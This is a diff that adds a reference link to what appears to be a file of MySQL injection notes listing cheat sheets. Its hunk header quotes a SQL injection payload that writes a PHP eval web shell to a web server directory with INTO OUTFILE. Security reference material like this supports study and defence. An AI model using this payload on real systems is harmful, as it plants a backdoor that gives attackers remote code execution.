@@ -363,3 +363,4 @@ UNION SELECT  "<?php eval($_POST['chybeta'])?>" INTO OUTFILE 'C:/phpstudy/WWW/te
 + [MySQL SQL Injection Cheat Sheet](http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/)
 + [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#Enablecmdshell)
 + [独自等待：MySQL注入总结](https://www.waitalone.cn/mysql-injection-summary.html	)
++ [chybeta:MySql注入备忘录 ](https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/)
